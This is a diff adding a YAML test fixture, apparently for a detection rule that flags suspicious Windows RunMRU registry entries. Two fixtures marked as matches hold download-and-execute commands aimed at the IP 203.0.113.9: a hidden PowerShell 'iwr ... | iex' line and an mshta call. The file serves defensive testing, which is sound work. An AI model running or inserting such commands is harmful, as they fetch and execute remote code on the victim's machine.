@@ -1,0 +1,49 @@
+docs:
+- id: ps
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    event: {category: registry, type: change}
+    registry:
+      path: HKEY_USERS\S-1-5-21-1\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\a
+      data:
+        strings: ['powershell -w hidden -c iwr http://203.0.113.9/a | iex\1']
+    process: {name: explorer.exe}
+- id: mshta
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    event: {category: registry, type: change}
+    registry:
+      path: HKEY_USERS\S-1-5-21-1\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\b
+      data:
+        strings: ['mshta http://203.0.113.9/x.hta\1']
+    process: {name: explorer.exe}
+- id: notepad
+  match: false
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    event: {category: registry, type: change}
+    registry:
+      path: HKEY_USERS\S-1-5-21-1\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\c
+      data:
+        strings: [notepad\1]
+    process: {name: explorer.exe}
+- id: cmd
+  match: false
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    event: {category: registry, type: change}
+    registry:
+      path: HKEY_USERS\S-1-5-21-1\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\d
+      data:
+        strings: [cmd\1]
+    process: {name: explorer.exe}
